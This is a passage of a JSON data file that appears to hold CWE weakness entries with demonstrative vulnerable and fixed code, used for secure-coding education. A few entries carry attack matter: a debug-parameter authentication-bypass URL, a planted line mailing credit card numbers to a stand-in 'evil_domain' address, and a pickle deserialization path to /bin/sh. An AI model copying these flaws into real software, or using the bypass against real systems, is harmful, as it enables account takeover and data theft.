        "demonstrative_examples": "Example 1 The following C/C++ and C# examples attempt to validate an int input parameter against the integer value 100. (bad code) Example Language: C int isValid(int value) { if (value=100) { printf(\"Value is valid\\\\n\"); return(1); } printf(\"Value is not valid\\\\n\"); return(0); } (bad code) Example Language: C# bool isValid(int value) { if (value=100) { Console.WriteLine(\"Value is valid.\"); return true; } Console.WriteLine(\"Value is not valid.\"); return false; } However, the expression to be evaluated in the if statement uses the assignment operator \"=\" rather than the comparison operator \"==\". The result of using the assignment operator instead of the comparison operator causes the int variable to be reassigned locally and the expression in the if statement will always evaluate to the value on the right hand side of the expression. This will result in the input value not being properly validated, which can cause unexpected results. Example 2 In this example, we show how assigning instead of comparing can impact code when values are being passed by reference instead of by value. Consider a scenario in which a string is being processed from user input. Assume the string has already been formatted such that different user inputs are concatenated with the colon character. When the processString function is called, the test for the colon character will result in an insertion of the colon character instead, adding new input separators. Since the string was passed by reference, the data sentinels will be inserted in the original string ( CWE-464 ), and further processing of the inputs will be altered, possibly malformed.. (bad code) Example Language: C void processString (char *str) { int i; for(i=0; i<strlen(str); i++) { if (isalnum(str[i])){ processChar(str[i]); } \"else if (str[i] = ':') {\" movingToNewInput();} } } } Example 3 The following Java example attempts to perform some processing based on the boolean value of the input parameter. However, the expression to be evaluated in the if statement uses the assignment operator \"=\" rather than the comparison operator \"==\". As with the previous examples, the variable will be reassigned locally and the expression in the if statement will evaluate to true and unintended processing may occur. (bad code) Example Language: Java public void checkValid(boolean isValid) { if (isValid = true) { System.out.println(\"Performing processing\"); doSomethingImportant(); } else { System.out.println(\"Not Valid, do not perform processing\"); return; } } While most Java compilers will catch the use of an assignment operator when a comparison operator is required, for boolean variables in Java the use of the assignment operator within an expression is allowed. If possible, try to avoid using comparison operators on boolean variables in java. Instead, let the values of the variables stand for themselves, as in the following code. (good code) Example Language: Java public void checkValid(boolean isValid) { if (isValid) { System.out.println(\"Performing processing\"); doSomethingImportant(); } else { System.out.println(\"Not Valid, do not perform processing\"); return; } } Alternatively, to test for false, just use the boolean NOT operator. (good code) Example Language: Java public void checkValid(boolean isValid) { if (!isValid) { System.out.println(\"Not Valid, do not perform processing\"); return; } System.out.println(\"Performing processing\"); doSomethingImportant(); } Example 4 The following example demonstrates the weakness. (bad code) Example Language: C void called(int foo){ if (foo=1) printf(\"foo\\\\n\"); } int main() { called(2); return 0; }"
    },
    {
        "id": 482,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: Java void called(int foo) { foo==1; if (foo==1) System.out.println(\"foo\\\\n\"); } int main() { called(2); return 0; } Example 2 The following C/C++ example shows a simple implementation of a stack that includes methods for adding and removing integer values from the stack. The example uses pointers to add and remove integer values to the stack array variable. (bad code) Example Language: C #define SIZE 50 int *tos, *p1, stack[SIZE]; void push(int i) { p1++; if(p1==(tos+SIZE)) { // Print stack overflow error message and exit } *p1 == i; } int pop(void) { if(p1==tos) { // Print stack underflow error message and exit } p1--; return *(p1+1); } int main(int argc, char *argv[]) { // initialize tos and p1 to point to the top of stack tos = stack; p1 = stack; // code to add and remove items from stack ... return 0; } The push method includes an expression to assign the integer value to the location in the stack pointed to by the pointer variable. However, this expression uses the comparison operator \"==\" rather than the assignment operator \"=\". The result of using the comparison operator instead of the assignment operator causes erroneous values to be entered into the stack and can cause unexpected results."
    },
    {
        "id": 483,
        "demonstrative_examples": "Example 1 In this example, the programmer has indented the statements to call Do_X() and Do_Y(), as if the intention is that these functions are only called when the condition is true. However, because there are no braces to signify the block, Do_Y() will always be executed, even if the condition is false. (bad code) Example Language: C if (condition==true) Do_X(); Do_Y(); This might not be what the programmer intended. When the condition is critical for security, such as in making a security decision or detecting a critical error, this may produce a vulnerability. Example 2 In this example, the programmer has indented the Do_Y() statement as if the intention is that the function should be associated with the preceding conditional and should only be called when the condition is true. However, because Do_X() was called on the same line as the conditional and there are no braces to signify the block, Do_Y() will always be executed, even if the condition is false. (bad code) Example Language: C if (condition==true) Do_X(); Do_Y(); This might not be what the programmer intended. When the condition is critical for security, such as in making a security decision or detecting a critical error, this may produce a vulnerability."
    },
    {
        "id": 484,
        "demonstrative_examples": "Example 1 In both of these examples, a message is printed based on the month passed into the function: (bad code) Example Language: Java public void printMessage(int month){ switch (month) { case 1: print(\"January\"); case 2: print(\"February\"); case 3: print(\"March\"); case 4: print(\"April\"); case 5: print(\"May\"); case 6: print(\"June\"); case 7: print(\"July\"); case 8: print(\"August\"); case 9: print(\"September\"); case 10: print(\"October\"); case 11: print(\"November\"); case 12: print(\"December\"); } println(\" is a great month\"); } (bad code) Example Language: C void printMessage(int month){ switch (month) { case 1: printf(\"January\"); case 2: printf(\"February\"); case 3: printf(\"March\"); case 4: printf(\"April\"); case 5: printff(\"May\"); case 6: printf(\"June\"); case 7: printf(\"July\"); case 8: printf(\"August\"); case 9: printf(\"September\"); case 10: printf(\"October\"); case 11: printf(\"November\"); case 12: printf(\"December\"); } printf(\" is a great month\"); } Both examples do not use a break statement after each case, which leads to unintended fall-through behavior. For example, calling \"printMessage(10)\" will result in the text \"OctoberNovemberDecember is a great month\" being printed."
    },
    {
        "id": 486,
        "demonstrative_examples": "Example 1 In this example, the expression in the if statement compares the class of the inputClass object to a trusted class by comparing the class names. (bad code) Example Language: Java if (inputClass.getClass().getName().equals(\"TrustedClassName\")) { // Do something assuming you trust inputClass // ... } However, multiple classes can have the same name therefore comparing an object\\'s class by name can allow untrusted classes of the same name as the trusted class to be use to execute unintended or incorrect code. To compare the class of an object to the intended class the getClass() method and the comparison operator \"==\" should be used to ensure the correct trusted class is used, as shown in the following example. (good code) Example Language: Java if (inputClass.getClass() == TrustedClass.class) { // Do something assuming you trust inputClass // ... } Example 2 \"In this example, the Java class, TrustedClass, overrides the equals method of the parent class Object to determine equivalence of objects of the class. The overridden equals method first determines if the object, obj, is the same class as the TrustedClass object and then compares the object's fields to determine if the objects are equivalent.\" (bad code) Example Language: Java public class TrustedClass { ... @Override public boolean equals(Object obj) { boolean isEquals = false; // first check to see if the object is of the same class if (obj.getClass().getName().equals(this.getClass().getName())) { // then compare object fields ... if (...) { isEquals = true; } } return isEquals; } ... } However, the equals method compares the class names of the object, obj, and the TrustedClass object to determine if they are the same class. As with the previous example using the name of the class to compare the class of objects can lead to the execution of unintended or incorrect code if the object passed to the equals method is of another class with the same name. To compare the class of an object to the intended class, the getClass() method and the comparison operator \"==\" should be used to ensure the correct trusted class is used, as shown in the following example. (good code) Example Language: Java public boolean equals(Object obj) { ... // first check to see if the object is of the same class if (obj.getClass() == this.getClass()) { ... } ... }"
    },
    {
        "id": 487,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: Java package math; public class Lebesgue implements Integration{ public final Static String youAreHidingThisFunction(functionToIntegrate){ return ...; } }"
    },
    {
        "id": 488,
        "demonstrative_examples": "Example 1 The following Servlet stores the value of a request parameter in a member field and then later echoes the parameter value to the response output stream. (bad code) Example Language: Java public class GuestBook extends HttpServlet { String name; protected void doPost (HttpServletRequest req, HttpServletResponse res) { name = req.getParameter(\"name\"); ... out.println(name + \", thanks for visiting!\"); } } While this code will work perfectly in a single-user environment, if two users access the Servlet at approximately the same time, it is possible for the two request handler threads to interleave in the following way: Thread 1: assign \"Dick\" to name Thread 2: assign \"Jane\" to name Thread 1: print \"Jane, thanks for visiting!\" Thread 2: print \"Jane, thanks for visiting!\" Thereby showing the first user the second user\\'s name."
    },
    {
        "id": 489,
        "demonstrative_examples": "Example 1 Debug code can be used to bypass authentication. For example, suppose an application has a login script that receives a username and a password. Assume also that a third, optional, parameter, called \"debug\", is interpreted by the script as requesting a switch to debug mode, and that when this parameter is given the username and password are not checked. In such a case, it is very simple to bypass the authentication process if the special behavior of the application regarding the debug parameter is known. In a case where the form is: (bad code) Example Language: HTML <FORM ACTION=\"/authenticate_login.cgi\"> <INPUT TYPE=TEXT name=username> <INPUT TYPE=PASSWORD name=password> <INPUT TYPE=SUBMIT> </FORM> Then a conforming link will look like: (informative) http://TARGET/authenticate_login.cgi?username=...&password=... An attacker can change this to: (attack code) http://TARGET/authenticate_login.cgi?username=&password=&debug=1 Which will grant the attacker access to the site, bypassing the authentication process."
    },
    {
        "id": 491,
        "demonstrative_examples": "Example 1 In this example, a public class \"BankAccount\" implements the cloneable() method which declares \"Object clone(string accountnumber)\": (bad code) Example Language: Java public class BankAccount implements Cloneable{ public Object clone(String accountnumber) throws CloneNotSupportedException { Object returnMe = new BankAccount(account number); ... } } Example 2 In the example below, a clone() method is defined without being declared final. (bad code) Example Language: Java protected Object clone() throws CloneNotSupportedException { ... }"
    },
    {
        "id": 492,
        "demonstrative_examples": "Example 1 The following Java Applet code mistakenly makes use of an inner class. (bad code) Example Language: Java public final class urlTool extends Applet { private final class urlHelper { ... } ... } Example 2 The following example shows a basic use of inner classes. The class OuterClass contains the private member inner class InnerClass. The private inner class InnerClass includes the method concat that accesses the private member variables of the class OuterClass to output the value of one of the private member variables of the class OuterClass and returns a string that is a concatenation of one of the private member variables of the class OuterClass, the separator input parameter of the method and the private member variable of the class InnerClass. (bad code) Example Language: Java public class OuterClass { // private member variables of OuterClass private String memberOne; private String memberTwo; // constructor of OuterClass public OuterClass(String varOne, String varTwo) { this.memberOne = varOne; this.memberTwo = varTwo; } // InnerClass is a member inner class of OuterClass private class InnerClass { private String innerMemberOne; public InnerClass(String innerVarOne) { this.innerMemberOne = innerVarOne; } public String concat(String separator) { // InnerClass has access to private member variables of OuterClass System.out.println(\"Value of memberOne is: \" + memberOne); return OuterClass.this.memberTwo + separator + this.innerMemberOne; } } } Although this is an acceptable use of inner classes it demonstrates one of the weaknesses of inner classes that inner classes have complete access to all member variables and methods of the enclosing class even those that are declared private and protected. When inner classes are compiled and translated into Java bytecode the JVM treats the inner class as a peer class with package level access to the enclosing class. To avoid this weakness of inner classes, consider using either static inner classes, local inner classes, or anonymous inner classes. The following Java example demonstrates the use of static inner classes using the previous example. The inner class InnerClass is declared using the static modifier that signifies that InnerClass is a static member of the enclosing class OuterClass. By declaring an inner class as a static member of the enclosing class, the inner class can only access other static members and methods of the enclosing class and prevents the inner class from accessing nonstatic member variables and methods of the enclosing class. In this case the inner class InnerClass can only access the static member variable memberTwo of the enclosing class OuterClass but cannot access the nonstatic member variable memberOne. (good code) Example Language: Java public class OuterClass { // private member variables of OuterClass private String memberOne; private static String memberTwo; // constructor of OuterClass public OuterClass(String varOne, String varTwo) { this.memberOne = varOne; this.memberTwo = varTwo; } // InnerClass is a static inner class of OuterClass private static class InnerClass { private String innerMemberOne; public InnerClass(String innerVarOne) { this.innerMemberOne = innerVarOne; } public String concat(String separator) { // InnerClass only has access to static member variables of OuterClass return memberTwo + separator + this.innerMemberOne; } } } The only limitation with using a static inner class is that as a static member of the enclosing class the inner class does not have a reference to instances of the enclosing class. For many situations this may not be ideal. An alternative is to use a local inner class or an anonymous inner class as shown in the next examples. Example 3 In the following example the BankAccount class contains the private member inner class InterestAdder that adds interest to the bank account balance. The start method of the BankAccount class creates an object of the inner class InterestAdder, the InterestAdder inner class implements the ActionListener interface with the method actionPerformed. A Timer object created within the start method of the BankAccount class invokes the actionPerformed method of the InterestAdder class every 30 days to add the interest to the bank account balance based on the interest rate passed to the start method as an input parameter. The inner class InterestAdder needs access to the private member variable balance of the BankAccount class in order to add the interest to the bank account balance. \"However as demonstrated in the previous example, because InterestAdder is a non-static member inner class of the BankAccount class, InterestAdder also has access to the private member variables of the BankAccount class - including the sensitive data contained in the private member variables for the bank account owner's name, Social Security number, and the bank account number.\" (bad code) Example Language: Java public class BankAccount { // private member variables of BankAccount class private String accountOwnerName; private String accountOwnerSSN; private int accountNumber; private double balance; // constructor for BankAccount class public BankAccount(String accountOwnerName, String accountOwnerSSN, int accountNumber, double initialBalance, int initialRate) { this.accountOwnerName = accountOwnerName; this.accountOwnerSSN = accountOwnerSSN; this.accountNumber = accountNumber; this.balance = initialBalance; this.start(initialRate); } // start method will add interest to balance every 30 days // creates timer object and interest adding action listener object public void start(double rate) { ActionListener adder = new InterestAdder(rate); Timer t = new Timer(1000 * 3600 * 24 * 30, adder); t.start(); } // InterestAdder is an inner class of BankAccount class // that implements the ActionListener interface private class InterestAdder implements ActionListener { private double rate; public InterestAdder(double aRate) { this.rate = aRate; } public void actionPerformed(ActionEvent event) { // update interest double interest = BankAccount.this.balance * rate / 100; BankAccount.this.balance += interest; } } } In the following example the InterestAdder class from the above example is declared locally within the start method of the BankAccount class. As a local inner class InterestAdder has its scope restricted to the method (or enclosing block) where it is declared, in this case only the start method has access to the inner class InterestAdder, no other classes including the enclosing class has knowledge of the inner class outside of the start method. This allows the inner class to access private member variables of the enclosing class but only within the scope of the enclosing method or block. (good code) Example Language: Java public class BankAccount { // private member variables of BankAccount class private String accountOwnerName; private String accountOwnerSSN; private int accountNumber; private double balance; // constructor for BankAccount class public BankAccount(String accountOwnerName, String accountOwnerSSN, int accountNumber, double initialBalance, int initialRate) { this.accountOwnerName = accountOwnerName; this.accountOwnerSSN = accountOwnerSSN; this.accountNumber = accountNumber; this.balance = initialBalance; this.start(initialRate); } // start method will add interest to balance every 30 days // creates timer object and interest adding action listener object public void start(final double rate) { // InterestAdder is a local inner class // that implements the ActionListener interface class InterestAdder implements ActionListener { public void actionPerformed(ActionEvent event) { // update interest double interest = BankAccount.this.balance * rate / 100; BankAccount.this.balance += interest; } } ActionListener adder = new InterestAdder(); Timer t = new Timer(1000 * 3600 * 24 * 30, adder); t.start(); } } A similar approach would be to use an anonymous inner class as demonstrated in the next example. An anonymous inner class is declared without a name and creates only a single instance of the inner class object. As in the previous example the anonymous inner class has its scope restricted to the start method of the BankAccount class. (good code) Example Language: Java public class BankAccount { // private member variables of BankAccount class private String accountOwnerName; private String accountOwnerSSN; private int accountNumber; private double balance; // constructor for BankAccount class public BankAccount(String accountOwnerName, String accountOwnerSSN, int accountNumber, double initialBalance, int initialRate) { this.accountOwnerName = accountOwnerName; this.accountOwnerSSN = accountOwnerSSN; this.accountNumber = accountNumber; this.balance = initialBalance; this.start(initialRate); } // start method will add interest to balance every 30 days // creates timer object and interest adding action listener object public void start(final double rate) { // anonymous inner class that implements the ActionListener interface ActionListener adder = new ActionListener() { public void actionPerformed(ActionEvent event) { // update interest double interest = BankAccount.this.balance * rate / 100; BankAccount.this.balance += interest; } }; Timer t = new Timer(1000 * 3600 * 24 * 30, adder); t.start(); } } Example 4 \"In the following Java example a simple applet provides the capability for a user to input a URL into a text field and have the URL opened in a new browser window. The applet contains an inner class that is an action listener for the submit button, when the user clicks the submit button the inner class action listener's actionPerformed method will open the URL entered into the text field in a new browser window. As with the previous examples using inner classes in this manner creates a security risk by exposing private variables and methods. Inner classes create an additional security risk with applets as applets are executed on a remote machine through a web browser within the same JVM and therefore may run side-by-side with other potentially malicious code.\" (bad code) public class UrlToolApplet extends Applet { // private member variables for applet components private Label enterUrlLabel; private TextField enterUrlTextField; private Button submitButton; // init method that adds components to applet // and creates button listener object public void init() { setLayout(new FlowLayout()); enterUrlLabel = new Label(\"Enter URL: \"); enterUrlTextField = new TextField(\"\", 20); submitButton = new Button(\"Submit\"); add(enterUrlLabel); add(enterUrlTextField); add(submitButton); ActionListener submitButtonListener = new SubmitButtonListener(); submitButton.addActionListener(submitButtonListener); } // button listener inner class for UrlToolApplet class private class SubmitButtonListener implements ActionListener { public void actionPerformed(ActionEvent evt) { if (evt.getSource() == submitButton) { String urlString = enterUrlTextField.getText(); URL url = null; try { url = new URL(urlString); } catch (MalformedURLException e) { System.err.println(\"Malformed URL: \" + urlString); } if (url != null) { getAppletContext().showDocument(url); } } } } } As with the previous examples a solution to this problem would be to use a static inner class, a local inner class or an anonymous inner class. An alternative solution would be to have the applet implement the action listener rather than using it as an inner class as shown in the following example. (good code) Example Language: Java public class UrlToolApplet extends Applet implements ActionListener { // private member variables for applet components private Label enterUrlLabel; private TextField enterUrlTextField; private Button submitButton; // init method that adds components to applet public void init() { setLayout(new FlowLayout()); enterUrlLabel = new Label(\"Enter URL: \"); enterUrlTextField = new TextField(\"\", 20); submitButton = new Button(\"Submit\"); add(enterUrlLabel); add(enterUrlTextField); add(submitButton); submitButton.addActionListener(this); } // implementation of actionPerformed method of ActionListener interface public void actionPerformed(ActionEvent evt) { if (evt.getSource() == submitButton) { String urlString = enterUrlTextField.getText(); URL url = null; try { url = new URL(urlString); } catch (MalformedURLException e) { System.err.println(\"Malformed URL: \" + urlString); } if (url != null) { getAppletContext().showDocument(url); } } } }"
    },
    {
        "id": 493,
        "demonstrative_examples": "Example 1 Suppose this WidgetData class is used for an e-commerce web site. The programmer attempts to prevent price-tampering attacks by setting the price of the widget using the constructor. (bad code) Example Language: Java public final class WidgetData extends Applet { public float price; ... public WidgetData(...) { this.price = LookupPrice(\"MyWidgetType\"); } } The price field is not final. Even though the value is set by the constructor, it could be modified by anybody that has access to an instance of WidgetData. Example 2 Assume the following code is intended to provide the location of a configuration file that controls execution of the application. (bad code) Example Language: C++ public string configPath = \"/etc/application/config.dat\"; (bad code) Example Language: Java public String configPath = new String(\"/etc/application/config.dat\"); While this field is readable from any function, and thus might allow an information leak of a pathname, a more serious problem is that it can be changed by any function."
    },
    {
        "id": 494,
        "demonstrative_examples": "Example 1 This example loads an external class from a local subdirectory. (bad code) Example Language: Java URL[] classURLs= new URL[]{ new URL(\"file:subdir/\") }; URLClassLoader loader = new URLClassLoader(classURLs); Class loadedClass = Class.forName(\"loadMe\", true, loader); \"This code does not ensure that the class loaded is the intended one, for example by verifying the class's checksum. An attacker may be able to modify the class file to execute malicious code.\" Example 2 This code includes an external script to get database credentials, then authenticates a user against the database, allowing access to the application. (bad code) Example Language: PHP //assume the password is already encrypted, avoiding CWE-312 function authenticate($username,$password){ include(\"http://external.example.com/dbInfo.php\"); //dbInfo.php makes $dbhost, $dbuser, $dbpass, $dbname available \"mysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');\" mysql_select_db($dbname); \"$query = 'Select * from users where username='.$username.' And password='.$password;\" $result = mysql_query($query); if(mysql_numrows($result) == 1){ mysql_close(); return true; } else{ mysql_close(); return false; } } This code does not verify that the external domain accessed is the intended one. An attacker may somehow cause the external domain name to resolve to an attack server, which would provide the information for a false database. The attacker may then steal the usernames and encrypted passwords from real user login attempts, or simply allow themself to access the application without a real user account. This example is also vulnerable to a MITM ( CWE-300 ) attack."
    },
    {
        "id": 495,
        "demonstrative_examples": "Example 1 Here, a public method in a Java class returns a reference to a private array. Given that arrays in Java are mutable, any modifications made to the returned reference would be reflected in the original private array. (bad code) Example Language: Java private String[] colors; public String[] getColors() { return colors; } Example 2 In this example, the Color class defines functions that return non-const references to private members (an array type and an integer type), which are then arbitrarily altered from outside the control of the class. (bad code) Example Language: C++ class Color { private: int[2] colorArray; int colorValue; public: Color () : colorArray { 1, 2 }, colorValue (3) { }; int[2] & fa () { return colorArray; } // return reference to private array int & fv () { return colorValue; } // return reference to private integer }; int main () { Color c; c.fa () [1] = 42; // modifies private array element c.fv () = 42; // modifies private int return 0; }"
    },
    {
        "id": 496,
        "demonstrative_examples": "Example 1 In the example below, the setRoles() method assigns a publically-controllable array to a private field, thus allowing the caller to modify the private array directly by virtue of the fact that arrays in Java are mutable. (bad code) Example Language: Java private String[] userRoles; public void setUserRoles(String[] userRoles) { this.userRoles = userRoles; }"
    },
    {
        "id": 497,
        "demonstrative_examples": "Example 1 The following code prints the path environment variable to the standard error stream: (bad code) Example Language: C char* path = getenv(\"PATH\"); ... sprintf(stderr, \"cannot find exe on path %s\\\\n\", path); Example 2 This code prints all of the running processes belonging to the current user. (bad code) Example Language: PHP //assume getCurrentUser() returns a username that is guaranteed to be alphanumeric (avoiding CWE-78 ) $userName = getCurrentUser(); \"$command = 'ps aux | grep ' . $userName;\" system($command); If invoked by an unauthorized web user, it is providing a web page of potentially sensitive information on the underlying system, such as command-line arguments ( CWE-497 ). This program is also potentially vulnerable to a PATH based attack ( CWE-426 ), as an attacker may be able to create malicious versions of the ps or grep commands. While the program does not explicitly raise privileges to run the system commands, the PHP interpreter may by default be running with higher privileges than users. Example 3 The following code prints an exception to the standard error stream: (bad code) Example Language: Java try { ... } catch (Exception e) { e.printStackTrace(); } (bad code) try { ... } catch (Exception e) { Console.Writeline(e); } Depending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system will be vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the search path could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. Example 4 The following code constructs a database connection string, uses it to create a new connection to the database, and prints it to the console. (bad code) Example Language: C# string cs=\"database=northwind; server=mySQLServer...\"; SqlConnection conn=new SqlConnection(cs); ... Console.Writeline(cs); Depending on the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the search path could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program."
    },
    {
        "id": 498,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: Java public class CloneClient { public CloneClient() //throws java.lang.CloneNotSupportedException { Teacher t1 = new Teacher(\"guddu\",\"22,nagar road\"); //... // Do some stuff to remove the teacher. Teacher t2 = (Teacher)t1.clone(); System.out.println(t2.name); } public static void main(String args[]) { new CloneClient(); } } class Teacher implements Cloneable { public Object clone() { try { return super.clone(); } catch (java.lang.CloneNotSupportedException e) { throw new RuntimeException(e.toString()); } } public String name; public String clas; public Teacher(String name,String clas) { this.name = name; this.clas = clas; } } Make classes uncloneable by defining a clone function like: (good code) Example Language: Java public final void clone() throws java.lang.CloneNotSupportedException { throw new java.lang.CloneNotSupportedException(); }"
    },
    {
        "id": 499,
        "demonstrative_examples": "Example 1 This code creates a new record for a medical patient: (bad code) Example Language: Java class PatientRecord { private String name; private String socialSecurityNum; public Patient(String name,String ssn) { this.SetName(name); this.SetSocialSecurityNumber(ssn); } } \"This object does not explicitly deny serialization, allowing an attacker to serialize an instance of this object and gain a patient's name and Social Security number even though those fields are private.\""
    },
    {
        "id": 500,
        "demonstrative_examples": "Example 1 The following examples use of a public static String variable to contain the name of a property/configuration file for the application. (bad code) Example Language: C++ class SomeAppClass { public: static string appPropertiesConfigFile = \"app/properties.config\"; ... } (bad code) Example Language: Java public class SomeAppClass { public static String appPropertiesFile = \"app/Application.properties\"; ... } Having a public static variable that is not marked final (constant) may allow the variable to the altered in a way not intended by the application. In this example the String variable can be modified to indicate a different on nonexistent properties file which could cause the application to crash or caused unexpected behavior. (good code) Example Language: C++ class SomeAppClass { public: static const string appPropertiesConfigFile = \"app/properties.config\"; ... } (good code) Example Language: Java public class SomeAppClass { public static final String appPropertiesFile = \"app/Application.properties\"; ... }"
    },
    {
        "id": 501,
        "demonstrative_examples": "Example 1 The following code accepts an HTTP request and stores the username parameter in the HTTP session object before checking to ensure that the user has been authenticated. (bad code) Example Language: Java usrname = request.getParameter(\"usrname\"); if (session.getAttribute(ATTR_USR) == null) { session.setAttribute(ATTR_USR, usrname); } (bad code) Example Language: C# usrname = request.Item(\"usrname\"); if (session.Item(ATTR_USR) == null) { session.Add(ATTR_USR, usrname); } Without well-established and maintained trust boundaries, programmers will inevitably lose track of which pieces of data have been validated and which have not. This confusion will eventually allow some data to be used without first being validated."
    },
    {
        "id": 502,
        "demonstrative_examples": "Example 1 This code snippet deserializes an object from a file and uses it as a UI button: (bad code) Example Language: Java try { File file = new File(\"object.obj\"); ObjectInputStream in = new ObjectInputStream(new FileInputStream(file)); javax.swing.JButton button = (javax.swing.JButton) in.readObject(); in.close(); } This code does not attempt to verify the source or contents of the file before deserializing it. An attacker may be able to replace the intended file with a file that contains arbitrary malicious code which will be executed when the button is pressed. To mitigate this, explicitly define final readObject() to prevent deserialization. An example of this is: (good code) Example Language: Java private final void readObject(ObjectInputStream in) throws java.io.IOException { throw new java.io.IOException(\"Cannot be deserialized\"); } Example 2 In Python, the Pickle library handles the serialization and deserialization processes. In this example derived from [ REF-467 ], the code receives and parses data, and afterwards tries to authenticate a user based on validating a token. (bad code) Example Language: Python try { class ExampleProtocol(protocol.Protocol): def dataReceived(self, data): # Code that would be here would parse the incoming data # After receiving headers, call confirmAuth() to authenticate def confirmAuth(self, headers): try: \"token = cPickle.loads(base64.b64decode(headers['AuthToken']))\" \"if not check_hmac(token['signature'], token['data'], getSecretKey()):\" raise AuthFail \"self.secure_data = token['data']\" except: raise AuthFail } Unfortunately, the code does not verify that the incoming data is legitimate. An attacker can construct a illegitimate, serialized object \"AuthToken\" that instantiates one of Python\\'s subprocesses to execute arbitrary commands. For instance,the attacker could construct a pickle that leverages Python\\'s subprocess module, which spawns new processes and includes a number of arguments for various uses. Since Pickle allows objects to define the process for how they should be unpickled, the attacker can direct the unpickle process to call Popen in the subprocess module and execute /bin/sh."
    },
    {
        "id": 506,
        "demonstrative_examples": "Example 1 \"In the example below, a malicous developer has injected code to send credit card numbers to the developer's own email address.\" (bad code) Example Language: Java boolean authorizeCard(String ccn) { // Authorize credit card. ... mailCardNumber(ccn, \"evil_developer@evil_domain.com\"); }"
    },
    {
        "id": 507,
        "demonstrative_examples": ""
    },
    {
        "id": 508,
        "demonstrative_examples": ""
    },
    {
        "id": 509,
        "demonstrative_examples": ""
    },
    {
        "id": 510,
        "demonstrative_examples": ""
    },
    {
        "id": 511,
        "demonstrative_examples": "Example 1 Typical examples of triggers include system date or time mechanisms, random number generators, and counters that wait for an opportunity to launch their payload. When triggered, a time-bomb may deny service by crashing the system, deleting files, or degrading system response-time."
    },
    {
        "id": 512,
        "demonstrative_examples": ""
    },
    {
        "id": 514,
        "demonstrative_examples": ""
    },
    {
        "id": 515,
        "demonstrative_examples": "Example 1 An excellent example of covert storage channels in a well known application is the ICMP error message echoing functionality. Due to ambiguities in the ICMP RFC, many IP implementations use the memory within the packet for storage or calculation. For this reason, certain fields of certain packets -- such as ICMP error packets which echo back parts of received messages -- may contain flaws or extra information which betrays information about the identity of the target operating system. This information is then used to build up evidence to decide the environment of the target. This is the first crucial step in determining if a given system is vulnerable to a particular flaw and what changes must be made to malicious code to mount a successful attack."
    },
    {
        "id": 520,
        "demonstrative_examples": ""
    },
    {
        "id": 521,
        "demonstrative_examples": ""
    },
    {
        "id": 522,
        "demonstrative_examples": "Example 1 \"This code changes a user's password.\" (bad code) Example Language: PHP \"$user = $_GET['user'];\" \"$pass = $_GET['pass'];\" \"$checkpass = $_GET['checkpass'];\" if ($pass == $checkpass) { SetUserPassword($user, $pass); } \"While the code confirms that the requesting user typed the same new password twice, it does not confirm that the user requesting the password change is the same user whose password will be changed. An attacker can request a change of another user's password and gain control of the victim's account.\" Example 2 The following code reads a password from a properties file and uses the password to connect to a database. (bad code) Example Language: Java ... Properties prop = new Properties(); prop.load(new FileInputStream(\"config.properties\")); String password = prop.getProperty(\"password\"); DriverManager.getConnection(url, usr, password); ... This code will run successfully, but anyone who has access to config.properties can read the value of password. If a devious employee has access to this information, they can use it to break into the system. Example 3 The following code reads a password from the registry and uses the password to create a new network credential. (bad code) Example Language: Java ... String password = regKey.GetValue(passKey).toString(); NetworkCredential netCred = new NetworkCredential(username,password,domain); ... This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of password. If a devious employee has access to this information, they can use it to break into the system Example 4 Both of these examples verify a password by comparing it to a stored compressed version. (bad code) Example Language: C int VerifyAdmin(char *password) { if (strcmp(compress(password), compressed_password)) { printf(\"Incorrect Password!\\\\n\"); return(0); } printf(\"Entering Diagnostic Mode...\\\\n\"); return(1); } (bad code) Example Language: Java int VerifyAdmin(String password) { if (passwd.Equals(compress(password), compressed_password)) { return(0); } //Diagnostic Mode return(1); } Because a compression algorithm is used instead of a one way hashing algorithm, an attacker can recover compressed passwords stored in the database. Example 5 The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext. This Java example shows a properties file with a cleartext username / password pair. (bad code) Example Language: Java # Java Web App ResourceBundle properties file ... webapp.ldap.username=secretUsername webapp.ldap.password=secretPassword ... The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext. (bad code) Example Language: ASP.NET ... <connectionStrings> <add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" /> </connectionStrings> ... Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information."
    },
    {
        "id": 523,
        "demonstrative_examples": ""
    },
    {
        "id": 524,
        "demonstrative_examples": ""
    },
    {
        "id": 525,
        "demonstrative_examples": ""
    },
    {
        "id": 526,
        "demonstrative_examples": ""
    },
    {
        "id": 527,
        "demonstrative_examples": ""
    },
    {
        "id": 528,
        "demonstrative_examples": ""
    },
    {
        "id": 529,
        "demonstrative_examples": ""
    },
    {
        "id": 530,
        "demonstrative_examples": ""
    },
    {
        "id": 531,
        "demonstrative_examples": "Example 1 Examples of common issues with test applications include administrative functions, listings of usernames, passwords or session identifiers and information about the system, server or application configuration."
    },
    {
        "id": 532,
